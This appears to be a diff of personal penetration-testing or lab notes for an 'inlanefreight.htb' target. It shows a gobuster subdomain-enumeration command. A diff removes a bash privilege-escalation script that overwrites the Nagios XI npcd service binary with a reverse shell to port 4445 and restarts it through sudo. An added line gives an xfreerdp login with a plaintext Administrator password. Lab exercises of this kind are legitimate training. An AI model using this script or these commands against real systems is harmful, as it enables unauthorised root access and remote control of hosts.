@@ -15,32 +15,5 @@ run
 
 gobuster vhost -u http://inlanefreight.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain 
 
-#!/bin/bash
 
-# Create npcd script
-echo "#!/bin/bash" > /tmp/npcd
-echo "bash -c 'bash -i >& /dev/tcp/10.10./4445 0>&1'" >> /tmp/npcd
-
-# Grant executable permissions on the npcd script
-chmod +x /tmp/npcd 2>/dev/null
-
-# Stop the npcd service
-sudo /usr/local/nagiosxi/scripts/manage_services.sh stop npcd
-
-# Replace original npcd script
-cp /tmp/npcd /usr/local/nagios/bin/npcd 2>/dev/null
-
-echo "[+] Start Up your listener"
-sleep 1
-echo "[+] nc -lvnp 4445"
-
-sleep 15
-
-echo "[+] Expect your shell noobies"
-
-# start service to recieve reverse shell
-sudo /usr/local/nagiosxi/scripts/manage_services.sh start npcd
-
-sleep 5
-
-echo "[+] nice job hacker"
+xfreerdp /v:10.129.95.200 /u:Administrator /p:"xcyj8izxNVzhf4z" /cert:ignore /sec:rdp
